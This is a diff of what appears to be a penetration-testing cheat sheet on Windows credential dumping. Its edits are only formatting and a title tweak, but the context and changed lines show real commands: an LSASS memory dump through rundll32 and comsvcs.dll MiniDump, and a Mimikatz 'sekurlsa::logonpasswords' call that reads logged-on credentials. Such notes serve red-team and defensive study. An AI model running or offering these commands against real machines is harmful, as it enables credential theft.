@@ -1,4 +1,4 @@
-# Credentials Dump
+# Credentials Dumping
 
 ## LSASS
 
@@ -37,8 +37,9 @@ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
 
 This usually shows recently logged on user and computer credentials.
 
-<pre class="language-powershell"><code class="lang-powershell"><strong>Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' 
-</strong></code></pre>
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' 
+```
 
 ## Vault
 
